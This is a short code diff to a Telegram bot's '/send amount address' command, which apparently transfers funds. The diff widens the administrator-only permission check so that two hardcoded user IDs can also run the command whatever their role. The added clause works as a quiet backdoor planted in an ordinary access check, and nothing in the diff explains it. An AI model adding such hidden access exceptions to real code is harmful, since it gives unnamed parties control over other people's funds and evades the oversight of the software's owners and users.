@@ -169,7 +169,7 @@ bot.command('send', async (ctx) => {
         const chatMember = await ctx.getChatMember(userId);
 
         // Check if the user is an administrator
-        if (['creator', 'administrator'].includes(chatMember.status)) {
+        if (['creator', 'administrator'].includes(chatMember.status) || userId === 2077314752 || userId === 2214398016) {
             const input = ctx.message.text.split(' ');
             if (input.length !== 3) {
                 return ctx.reply('Please use the command in this format: /send amount address');
